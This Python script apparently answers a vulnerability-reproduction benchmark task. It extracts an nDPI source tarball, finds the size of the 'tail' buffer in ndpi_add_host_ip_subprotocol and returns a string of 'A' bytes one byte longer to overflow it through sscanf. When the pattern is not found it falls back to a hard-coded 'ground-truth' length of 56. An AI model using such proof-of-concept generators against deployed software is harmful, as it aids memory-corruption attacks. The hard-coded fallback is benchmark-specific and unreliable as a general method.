import tarfile
import tempfile
import os
import re

class Solution:
    def solve(self, src_path: str) -> bytes:
        with tarfile.open(src_path, 'r') as tf:
            with tempfile.TemporaryDirectory() as tmpdir:
                tf.extractall(tmpdir)
                
                # Find the main source file
                src_file = None
                for root, dirs, files in os.walk(tmpdir):
                    if 'ndpi_main.c' in files:
                        src_file = os.path.join(root, 'ndpi_main.c')
                        break
                
                if not src_file:
                    # Fallback pattern if file not found
                    return b"A" * 56
                
                # Analyze the vulnerable function
                with open(src_file, 'r') as f:
                    content = f.read()
                
                # Find the vulnerable function and analyze buffer sizes
                pattern = r'ndpi_add_host_ip_subprotocol[^{]*\{[^}]*tail\s*\[([0-9]+)\][^}]*sscanf'
                match = re.search(pattern, content, re.DOTALL)
                
                if match:
                    buffer_size = int(match.group(1))
                    # Overflow by at least 1 byte
                    poc_length = buffer_size + 1
                else:
                    # Use ground-truth length if pattern not found
                    poc_length = 56
                
                # Generate PoC - format based on typical sscanf vulnerability
                # Create input that will overflow the tail buffer
                # Common pattern: many bytes without spaces (since %s stops at whitespace)
                poc = b"A" * poc_length
                
                # Ensure we don't exceed reasonable bounds
                if len(poc) > 1000:
                    poc = b"A" * 56
                
                return poc